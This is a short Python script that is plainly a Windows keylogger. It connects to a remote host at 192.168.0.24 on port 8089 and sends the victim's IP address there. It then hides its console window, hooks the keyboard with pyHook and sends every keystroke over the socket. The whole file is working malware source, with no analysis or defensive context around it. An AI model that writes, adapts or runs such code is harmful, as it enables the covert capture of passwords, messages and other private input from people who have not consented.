#-*-coding:utf-8-*-

import win32api
import win32console
import win32gui
import pythoncom,pyHook
import os
import socket


HOST = "192.168.0.24"
PORT = 8089

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)

ip_address = ip_address.encode("utf-8")
s.send(ip_address)


win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

 
def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs="\n"
        NUM = keylogs
        NUM = NUM.encode("utf-8")
        s.send(NUM)
        
        
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

        
            
